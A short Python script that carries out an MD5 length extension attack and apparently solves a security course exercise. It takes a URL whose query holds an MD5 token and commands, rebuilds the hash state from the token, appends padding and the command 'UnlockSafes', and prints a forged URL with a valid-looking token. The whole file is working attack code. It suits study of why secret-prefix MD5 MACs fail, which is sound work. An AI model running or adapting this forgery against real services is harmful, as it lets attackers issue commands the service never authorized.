#!/usr/bin/python3

#Length extention attack

import sys
from urllib.parse import urlparse, quote
from pymd5 import md5, padding

def main():
    # Take in URL and parse it
    apiUrl = sys.argv[1]
    parseURL = urlparse(apiUrl)

    #Split out the commands and 
    splitCommands = parseURL.query[6:]
    splitCommands = splitCommands.split('&')

    #get md5 token from input
    md5Token = splitCommands[0]

    #Put commands back together with & symbol
    commands = ((map('&{0}'.format, splitCommands[1:])))
    msg =''.join(str(p) for p in commands)
    #Subtract one from length to account for and sybol included at the beginning
    msgLen = 8 + len(msg)-1

    #Find bits and set md5 hash state
    bits = (msgLen + len(padding(msgLen*8)))*8
    h = md5(state=bytes.fromhex(md5Token), count=bits)

    #Update hash to include new command
    x = "&command=UnlockSafes"
    h.update(x)
    padd = padding((msgLen)*8)

    
    print(parseURL.scheme + '://'  + parseURL.netloc + parseURL.path + parseURL.params + '?token=' + h.hexdigest() + msg + quote(padd)  + x)
    
if __name__ == "__main__":
    main()
